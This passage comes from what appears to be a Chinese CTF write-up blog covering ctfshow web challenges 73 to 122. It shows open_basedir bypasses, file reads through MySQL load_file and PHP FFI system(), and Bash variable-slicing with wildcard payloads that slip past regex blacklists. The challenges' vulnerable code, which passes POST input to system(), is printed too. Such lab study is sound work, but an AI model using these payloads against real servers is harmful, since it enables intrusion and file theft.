</span></span></span><span class="line"><span class="ln">206</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>记得要转url</p>
<p><img alt="image-20241129232845637" loading="lazy" src="../assets/image-20241129232845637.png"></p>
<h5 id="所以什么是uaf呢">所以什么是uaf呢？<a hidden class="anchor" aria-hidden="true" href="#所以什么是uaf呢">#</a></h5>
<p>（先挖个坑回头补）</p>
<h4 id="web73">web73<a hidden class="anchor" aria-hidden="true" href="#web73">#</a></h4>
<p>这一题和上一题的区别其实就是flag的文件改名了，我们用上一题的方法读一下文件</p>
<pre tabindex="0"><code>c=?&gt;&lt;?php $a=new DirectoryIterator(&#34;glob:///*&#34;);// 创建一个DirectoryIterator对象，遍历根目录
foreach($a as $f)// 遍历每个条目
{
   echo($f-&gt;__toString().&#39; &#39;);// 输出条目的名称，并添加一个空格
}
exit(0); // 终止脚本执行
?&gt;
</code></pre><p><img alt="image-20241129234701193" loading="lazy" src="../assets/image-20241129234701193.png"></p>
<p>可以看到一个flagc.txt文件</p>
<p>这题其实已经关闭了open_basedir，所以我们也可以用之前的方法读</p>
<pre tabindex="0"><code>var_export(scandir(&#39;/&#39;));exit();
</code></pre><pre tabindex="0"><code>echo(implode(&#39; &#39;,scandir(&#39;/&#39;)));exit();
</code></pre><p>读文件的话上一题的uaf方法被ban了，这题用不了</p>
<p>所以我们还是用之前方法</p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flagc.txt&#39;);exit();
</code></pre><p><img alt="image-20241129235458680" loading="lazy" src="../assets/image-20241129235458680.png"></p>
<h4 id="web74">web74<a hidden class="anchor" aria-hidden="true" href="#web74">#</a></h4>
<p><img alt="image-20241129235835167" loading="lazy" src="../assets/image-20241129235835167.png"></p>
<p>这题我先用之前的方法var_export试试能不能读到目录，发现显示null，应该是open_basedir打开了</p>
<p><img alt="image-20241130000019913" loading="lazy" src="../assets/image-20241130000019913.png"></p>
<p>接着用glob协议的方法读到了，flag文件名叫做flagx.txt</p>
<p>先用uaf的方法试试</p>
<p><img alt="image-20241130000253395" loading="lazy" src="../assets/image-20241130000253395.png"></p>
<p>发现这条路被ban掉了</p>
<p><img alt="image-20241130000438521" loading="lazy" src="../assets/image-20241130000438521.png"></p>
<p>最后用</p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flagx.txt&#39;);exit();
</code></pre><p>成功查到了flag</p>
<h4 id="web75">web75<a hidden class="anchor" aria-hidden="true" href="#web75">#</a></h4>
<p><img alt="image-20241130001438365" loading="lazy" src="../assets/image-20241130001438365.png"></p>
<p>这题要用glob查文件，用var_export查不了</p>
<p>接下来是读文件</p>
<p>尝试了uaf和readgzfile之类的方法都失败了</p>
<p>没办法看看大佬怎么做的</p>
<p>我们其实可以用到mysql的load_file方法，从而读到flag</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="nv">$conn</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;ctftraining&#34;</span><span class="p">);</span> <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select load_file(&#39;/flag36.txt&#39;) as a&#34;</span><span class="p">;</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">while</span><span class="p">(</span><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$row</span><span class="p">)){</span> <span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span> <span class="p">}</span> <span class="k">exit</span><span class="p">();</span>
</span></span></code></pre></div><p>豆包解释一下</p>
<blockquote>
<ol>
<li>数据库连接：
<ul>
<li><code>$conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ctftraining&quot;);</code></li>
<li>这行代码使用 MySQLi 扩展建立了一个与 MySQL 数据库的连接。它指定了数据库服务器的 IP 地址为<code>127.0.0.1</code>（本地主机），用户名是<code>root</code>，密码也是<code>root</code>，要连接的数据库名称是<code>ctftraining</code>。如果连接成功，<code>$conn</code>将保存这个数据库连接对象，以便后续进行数据库操作；如果连接失败，将会产生一个错误信息（不过在这段代码中没有对连接失败情况做显式处理）。</li>
</ul>
</li>
<li>SQL 查询语句构建：
<ul>
<li><code>$sql = &quot;select load_file('/flag36.txt') as a&quot;;</code></li>
<li>这里构建了一个 SQL 查询语句。<code>load_file()</code>是 MySQL 中的一个函数，它的作用是读取指定路径的文件内容，并以字符串的形式返回。在这个查询中，它试图读取服务器上<code>/flag36.txt</code>文件的内容，并给查询结果的这一列起了一个别名<code>a</code>。</li>
</ul>
</li>
<li>执行查询并获取结果：
<ul>
<li><code>$row = mysqli_query($conn, $sql);</code></li>
<li>这行代码使用已经建立好的数据库连接<code>$conn</code>来执行前面构建的 SQL 查询语句<code>$sql</code>。如果查询执行成功，<code>$row</code>将包含查询结果集的资源对象（可以理解为指向查询结果数据的一种引用）；如果查询失败，同样会产生一个错误信息（这里也未做显式处理）。</li>
<li><code>while($result=mysqli_fetch_array($row)){ echo $result['a']; }</code></li>
<li>这个<code>while</code>循环用于遍历查询结果集。<code>mysqli_fetch_array()</code>函数每次从结果集中获取一行数据，并以数组的形式返回。在循环内部，它通过<code>$result['a']</code>来获取前面查询中<code>load_file()</code>函数读取到的文件内容（因为在查询中给这一列起了别名<code>a</code>），并将其输出到屏幕上。</li>
</ul>
</li>
<li>程序结束：
<ul>
<li><code>exit();</code></li>
<li>这行代码使得脚本在完成查询结果输出后立即终止执行，不再执行后续可能存在的其他代码。</li>
</ul>
</li>
</ol></blockquote>
<p>也可以</p>
<p>用PDO的方法来实现同样的目的</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="k">try</span> <span class="p">{</span><span class="nv">$dbh</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;mysql:host=localhost;dbname=ctftraining&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s1">&#39;root&#39;</span><span class="p">);</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$dbh</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;select load_file(&#34;/flag36.txt&#34;)&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;|&#34;</span><span class="p">;</span> <span class="p">}</span><span class="nv">$dbh</span> <span class="o">=</span> <span class="k">null</span><span class="p">;}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$e</span><span class="o">-</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">&gt;</span><span class="nx">getMessage</span><span class="p">();</span><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);}</span><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span></code></pre></div><blockquote>
<ol>
<li>数据库连接建立：
<ul>
<li><code>$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');</code></li>
<li>这行代码使用 PDO 创建了一个与 MySQL 数据库的连接对象 <code>$dbh</code>。它指定了数据库服务器的主机名为 <code>localhost</code>，要连接的数据库名称是 <code>ctftraining</code>，以及用于登录数据库的用户名 <code>root</code> 和密码 <code>root</code>。如果连接成功，后续就可以通过这个对象进行数据库相关的操作；如果连接失败，将会抛出一个 <code>PDOException</code> 异常。</li>
</ul>
</li>
<li>执行查询操作：
<ul>
<li><code>foreach($dbh-&gt;query('select load_file(&quot;/flag36.txt&quot;)') as $row)</code></li>
<li>这里通过已建立的数据库连接对象 <code>$dbh</code> 执行了一个 SQL 查询语句 <code>select load_file(&quot;/flag36.txt&quot;)</code>。<code>load_file()</code> 是 MySQL 中的一个函数，用于读取指定路径的文件内容。这个查询语句的目的就是获取服务器上 <code>/flag36.txt</code> 文件的内容。</li>
<li>然后使用 <code>foreach</code> 循环来遍历查询结果集。每次循环，<code>$row</code> 将会获取到查询结果集中的一行数据，由于查询结果只有一列（即 <code>load_file()</code> 函数返回的文件内容那一列），所以可以通过 <code>$row[0]</code> 来获取这一列的值。</li>
</ul>
</li>
</ol>
<h4 id="结果输出与资源释放">结果输出与资源释放<a hidden class="anchor" aria-hidden="true" href="#结果输出与资源释放">#</a></h4>
<ol>
<li>结果输出：
<ul>
<li><code>echo($row[0]).&quot;|&quot;;</code></li>
<li>在每次遍历查询结果集的循环中，这行代码将获取到的文件内容（通过 <code>$row[0]</code>）输出到屏幕上，并在后面添加一个 <code>|</code> 作为分隔符。</li>
</ul>
</li>
<li>数据库连接资源释放：
<ul>
<li><code>$dbh = null;</code></li>
<li>当查询结果处理完毕后，这行代码将数据库连接对象 <code>$dbh</code> 设置为 <code>null</code>，这有助于释放与该连接相关的资源，确保系统资源的合理利用。</li>
</ul>
</li>
</ol>
<h4 id="异常处理">异常处理<a hidden class="anchor" aria-hidden="true" href="#异常处理">#</a></h4>
<ol>
<li>捕获异常：
<ul>
<li><code>catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}</code></li>
<li>整个 <code>try</code> 代码块被放置在一个 <code>try-catch</code> 语句中。如果在尝试建立数据库连接或执行查询等操作过程中出现任何 <code>PDOException</code> 异常（比如数据库连接失败、查询语句语法错误等情况），异常将会被这个 <code>catch</code> 块捕获。</li>
<li>一旦捕获到异常，<code>catch</code> 块中的代码将会执行。这里首先通过 <code>$e-&gt;getMessage()</code> 获取到具体的异常消息，并将其输出到屏幕上，然后使用 <code>exit(0)</code> 终止脚本的执行，以防止后续可能出现的错误或未定义行为。</li>
</ul>
</li>
</ol></blockquote>
<h4 id="web76">web76<a hidden class="anchor" aria-hidden="true" href="#web76">#</a></h4>
<p><img alt="image-20241130003249705" loading="lazy" src="../assets/image-20241130003249705.png"></p>
<p>这题依旧是用glob协议查目录，得到文件名为flag36d.txt</p>
<p>用上一题mysql的方法，成功查到flag</p>
<p>payload:</p>
<pre tabindex="0"><code>c=$conn = mysqli_connect(&#34;127.0.0.1&#34;, &#34;root&#34;, &#34;root&#34;, &#34;ctftraining&#34;); $sql = &#34;select load_file(&#39;/flag36d.txt&#39;) as a&#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[&#39;a&#39;]; } exit();
</code></pre><h4 id="web77">web77<a hidden class="anchor" aria-hidden="true" href="#web77">#</a></h4>
<p><img alt="image-20241130004911319" loading="lazy" src="../assets/image-20241130004911319.png"></p>
<p>用glob协议的方法查出flag文件为flag36x.php，还有一个readflag文件</p>
<p>接下来要看看怎么查文件</p>
<p><img alt="image-20241130005425204" loading="lazy" src="../assets/image-20241130005425204.png"></p>
<p>上两题用到的读flag的方法（mysql）这题用不了，需要想点其他的方法</p>
<p>官方的wp用 PHP 中的 FFI（Foreign Function Interface）方法来调用 C 语言的 system 函数，并执行一个 Shell 命令。</p>
<blockquote>
<h5 id="什么是ffi">什么是FFI?<a hidden class="anchor" aria-hidden="true" href="#什么是ffi">#</a></h5>
<p>PHP FFI（Foreign Function Interface）是 PHP 7.4 及以上版本引入的一个强大功能。它允许 PHP 代码直接调用 C 语言函数，从而实现了 PHP 与 C 语言的高效交互。这为 PHP 开发者提供了一种利用 C 语言的高性能和底层操作系统功能的方式。</p></blockquote>
<p>payload:</p>
<pre tabindex="0"><code>$ffi = FFI::cdef(&#34;int system(const char *command);&#34;);//创建一个system对象
$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的
$ffi-&gt;system($a);//通过$ffi去调用system函数
</code></pre><p>通过执行目录中的 /readflag 程序并将其输出重定向到文件 1.txt中（因为只是执行的话没有回显）</p>
<p>执行一下</p>
<p><img alt="image-20241130011301444" loading="lazy" src="../assets/image-20241130011301444.png"></p>
<p>看到有回显应该是成功了，访问一下1.txt</p>
<p><img alt="image-20241130011352138" loading="lazy" src="../assets/image-20241130011352138.png"></p>
<p>由于当前用户权限不足我们是不能直接读flag36x.php文件中的内容的，只能通过readflag（脚本里面会进行提权）来读</p>
<h4 id="web118">web118<a hidden class="anchor" aria-hidden="true" href="#web118">#</a></h4>
<p>原文地址：https://blog.csdn.net/Myon5/article/details/140145005</p>
<p>输入数字和小写字母，回显 evil input</p>
<p><img alt="img" loading="lazy" src="../assets/39825df758159aeb1423f84893826541.png"></p>
<p>查看源码，发现这里会将提交的参数 code 传给 system 函数</p>
<p><img alt="img" loading="lazy" src="../assets/ef28276a3cf0375675a6bde71506fcec.png"></p>
<p>使用 burpsuite 抓包进行单个字符的模糊测试 fuzz：</p>
<p><img alt="img" loading="lazy" src="../assets/584e4b78646d635bd58f6507fe24c725.png"></p>
<p>发现过滤掉了数字和小写字母以及一些符号，下面框起来的部分是可用的</p>
<p><img alt="img" loading="lazy" src="../assets/cce43cb38968e67bc8db9d0b7dec6750.png"></p>
<p>结合题目提示：flag 在 flag.php</p>
<p><img alt="img" loading="lazy" src="../assets/8eb2710f201069ae75d2229e71d76be1.png"></p>
<p>那么我们就需要构造出命令去读取 flag.php</p>
<blockquote>
<p>我们先来了解一下 Linux 的内置变量
在 Linux 系统中，有许多内置变量（环境变量）用于配置系统行为和存储系统信息。</p>
<p>（1）$BASH</p>
<p>描述：指向当前使用的Bash解释器的路径。
示例：/bin/bash
用途：用于确定正在使用的Bash版本和路径。</p>
<p>（2） $PATH</p>
<p>描述：存储一系列路径，这些路径用于查找可执行文件，当你在命令行中输入命令时，系统会在这些路径中查找对应的可执行文件。
示例：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
用途：影响命令的查找和执行，可以添加自定义脚本或程序的路径。</p>
<p>（3）$HOME</p>
<p>描述：当前用户的主目录路径。
示例：/home/username
用途：表示当前用户的主目录，通常用于存储用户配置文件和个人数据。</p>
<p>（4）$PWD</p>
<p>描述：当前工作目录（Present Working Directory）。
示例：/home/username/projects
用途：表示当前的工作目录路径，常用于脚本和命令中获取或显示当前目录。</p>
<p>（5）$USER</p>
<p>描述：当前登录的用户名。
示例：username
用途：表示当前用户的名称，常用于显示或检查用户信息。</p>
<p>（6）$SHELL</p>
<p>描述：当前用户的默认shell。
示例：/bin/bash
用途：表示用户登录时使用的默认shell路径。</p>
<p>（7）$UID</p>
<p>描述：当前用户的用户ID。
示例：1000（普通用户），0（root用户）
用途：标识当前用户的唯一ID。</p>
<p>（8）$IFS</p>
<p>描述：内部字段分隔符（Internal Field Separator），用于分割输入的字段，默认为空格、制表符和换行符。
示例：默认值为<space><tab><newline>
用途：影响脚本中的字段分割，常用于处理输入和解析文本。</p></blockquote>
<p>此外还有很多的内置变量：</p>
<p><img alt="img" loading="lazy" src="../assets/3b6a3d156d5f7a2118ef1e73708dc47f.png"></p>
<p>接下来我们需要知道 Bash 变量的切片，与 python 的切片类似，目的还是从指定位置开始提取子字符串，用法：${VAR:offset:length}，看例子：</p>
<pre tabindex="0"><code>${PWD:1:2}
</code></pre><p>提取从第二个字符开始的两个字符，即 ro，在 Bash 中，字符串切片的索引也是从 0 开始的。</p>
<p><img alt="img" loading="lazy" src="../assets/9a68ddaee573e2a4c8f029c1b1439303.png"></p>
<p>如果只填一个参数，会默认从指定的位置开始提取到字符串的末尾：</p>
<pre tabindex="0"><code>${PWD:3}
</code></pre><p><img alt="img" loading="lazy" src="../assets/05801ab65baf0c3f8ef755d2440035d3.png"></p>
<p>简单测一下我们就可以看出波浪号的效果：从结尾开始取</p>
<p><img alt="img" loading="lazy" src="../assets/05801ab65baf0c3f8ef755d2440035d3-20250107141042427.png"></p>
<p>但是这里数字被过滤了，因此我们使用大写字母绕过：</p>
<p>可以发现任意的大小写字母与数字 0 等效</p>
<p><img alt="img" loading="lazy" src="../assets/20028ec8b263329b22bf7127236e5cb9.png"></p>
<p>不难想到这里的 $PWD 应该是 /var/www/html（网页服务所在的常见路径）；</p>
<p>而 $PATH 的结尾应该也是 /bin（这个在前面我们已经测试过了）。</p>
<p><img alt="img" loading="lazy" src="../assets/1f28e989351c75dc265bdf60244d9bad.png"></p>
<p>因此我们可以构造出 nl 命令来读取 flag.php，由于 ? 可用，因此我们可以进行通配，绕过字母的过滤，构造 payload：</p>
<pre tabindex="0"><code>${PATH:~Q}${PWD:~Q} ????.???
</code></pre><p><img alt="img" loading="lazy" src="../assets/22118ba0371383bb7b3ff39f6dd322be.png"></p>
<p>当然题目还给了其他 payload：</p>
<pre tabindex="0"><code>${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
</code></pre><p>在Bash中，${#var} 的语法用于获取变量 var 的长度（即字符数）。</p>
<p>这种形式可以应用于任何变量，无论是字符串变量还是环境变量。</p>
<p>我们知道 ${HOME} 是 /root，因此 ${#HOME} 就是 5。</p>
<p><img alt="img" loading="lazy" src="../assets/699d0549b84964404cd7c602c5a687d5.png"></p>
<p>以此类推，最终将这些数字应用到切片中去，绕过对数字的过滤，构造出我们想要执行的命令。</p>
<h4 id="web119">Web119<a hidden class="anchor" aria-hidden="true" href="#web119">#</a></h4>
<p>先用上一题的payload打了一下，显示evil input</p>
<p>测了一下上题用的PATH被ban了</p>
<p>换个方法</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
相当于/???/??t ????.???
匹配/bin/cat ????.???
</code></pre><p>${#SHLVL}}=1</p>
<p>${PWD::${#SHLVL}} = /</p>
<p>${#HOSTNAME}=4    //用户名的位数，这里用户名是root，故为4</p>
<p>另一种方法</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
相当于/???/?????4 ????.??? 或者 /???/?????5 ????.???
想要匹配/bin/base64 ????.???
</code></pre><p>{#RANDOM} = 4或5</p>
<p>由于可能是5，所以要多试几次，还要进行base64解码</p>
<h4 id="web120">web120<a hidden class="anchor" aria-hidden="true" href="#web120">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题把上题的HOME也ban了，但是第二种方法还能出，而且长度也符合</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
</code></pre><p><img alt="image-20250118212249002" loading="lazy" src="../assets/image-20250118212249002.png"></p>
<p>或</p>
<pre tabindex="0"><code>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
</code></pre><h4 id="web121">web121<a hidden class="anchor" aria-hidden="true" href="#web121">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;evil input&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题SHLVL被ban了，可以用?代替</p>
<p>${#?}=1</p>
<p>payload</p>
<pre tabindex="0"><code>${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
</code></pre><p>或</p>
<pre tabindex="0"><code>${PWD::${#?}}???${PWD::${#?}}${PWD::${#?}}?? ????.???
/bin/rev
</code></pre><p>rev是倒叙输出的</p>
<h4 id="web122">web122<a hidden class="anchor" aria-hidden="true" href="#web122">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>    
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">65</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="s1">&#39;you are so long , I dont like &#39;</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;div align=&#34;center&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">system</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
